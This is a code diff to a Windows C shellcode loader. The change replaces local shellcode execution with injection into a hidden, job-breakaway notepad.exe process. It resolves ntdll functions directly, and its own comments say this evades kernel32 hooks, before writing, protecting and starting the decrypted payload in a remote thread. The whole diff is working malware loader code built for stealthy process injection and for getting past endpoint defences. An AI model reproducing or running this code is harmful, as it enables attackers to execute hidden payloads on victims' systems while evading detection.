@@ -220,6 +220,18 @@ cleanup:
     return NULL;
 }
 
+/* ── ntdll function typedefs for process injection ───────────────────────── */
+
+typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
+    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
+    HANDLE, PVOID, PVOID, ULONG, PULONG);
+typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
+    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
+    HANDLE, PVOID, BOOLEAN, ULONG, PSIZE_T, PSIZE_T,
+    PVOID, PVOID, PHANDLE, PVOID);
+
 /* ── Entry point ─────────────────────────────────────────────────────────── */
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
@@ -238,35 +250,55 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow)
     /* 3. XOR decrypt in-place */
     xor_decrypt(sc, sc_len, xor_key, key_len);
 
-    /* 4. Allocate RW memory and copy shellcode */
-    unsigned char *exec_mem = (unsigned char *)VirtualAlloc(
-            NULL, sc_len,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE);
-    if (!exec_mem) { VirtualFree(sc, 0, MEM_RELEASE); return 1; }
+    /* 4. Spawn sacrificial process (breakaway from WinRM/job objects) */
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    BOOL ok = CreateProcessA(
+        "C:\\Windows\\System32\\notepad.exe",
+        NULL, NULL, NULL, FALSE,
+        CREATE_NO_WINDOW | 0x01000000 /* CREATE_BREAKAWAY_FROM_JOB */,
+        NULL, NULL, &si, &pi);
+    if (!ok) {
+        /* retry without breakaway if the job object forbids it */
+        ok = CreateProcessA("C:\\Windows\\System32\\notepad.exe",
+            NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    }
+    if (!ok) { VirtualFree(sc, 0, MEM_RELEASE); return 1; }
+    Sleep(500);
 
-    memcpy(exec_mem, sc, sc_len);
+    /* 5. Resolve ntdll functions (avoids kernel32 VirtualAllocEx/WriteProcessMemory hooks) */
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); VirtualFree(sc, 0, MEM_RELEASE); return 1; }
+    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    pNtWriteVirtualMemory    NtWrite = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    pNtProtectVirtualMemory  NtProt  = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+    pRtlCreateUserThread     RtlSpawn = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
+    if (!NtAlloc || !NtWrite || !NtProt || !RtlSpawn) {
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread); VirtualFree(sc, 0, MEM_RELEASE); return 1;
+    }
+
+    /* 6. Allocate RW in remote process, write shellcode, flip to RX */
+    PVOID  addr = NULL;
+    SIZE_T sz   = sc_len;
+    NtAlloc(pi.hProcess, &addr, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!addr) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); VirtualFree(sc, 0, MEM_RELEASE); return 1; }
+
+    ULONG wb = 0;
+    NtWrite(pi.hProcess, addr, sc, (ULONG)sc_len, &wb);
     VirtualFree(sc, 0, MEM_RELEASE);
 
-    /* 5. Flip to RX */
-    DWORD old_prot = 0;
-    if (!VirtualProtect(exec_mem, sc_len, PAGE_EXECUTE_READ, &old_prot)) {
-        VirtualFree(exec_mem, 0, MEM_RELEASE);
-        return 1;
-    }
+    ULONG old_prot = 0;
+    /* sz is now page-aligned from NtAlloc — use it directly for NtProt */
+    NtProt(pi.hProcess, &addr, &sz, PAGE_EXECUTE_READ, &old_prot);
 
-    /* 6. Execute via CreateThread + wait */
-    HANDLE hThread = CreateThread(
-            NULL, 0,
-            (LPTHREAD_START_ROUTINE)exec_mem,
-            NULL, 0, NULL);
-    if (!hThread) {
-        VirtualFree(exec_mem, 0, MEM_RELEASE);
-        return 1;
-    }
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-
-    /* exec_mem intentionally not freed — shellcode may still reference it */
+    /* 7. Create remote thread — agent runs independently in notepad.exe */
+    HANDLE hThread = NULL;
+    RtlSpawn(pi.hProcess, NULL, FALSE, 0, NULL, NULL, addr, NULL, &hThread, NULL);
+    if (hThread) CloseHandle(hThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
     return 0;
 }
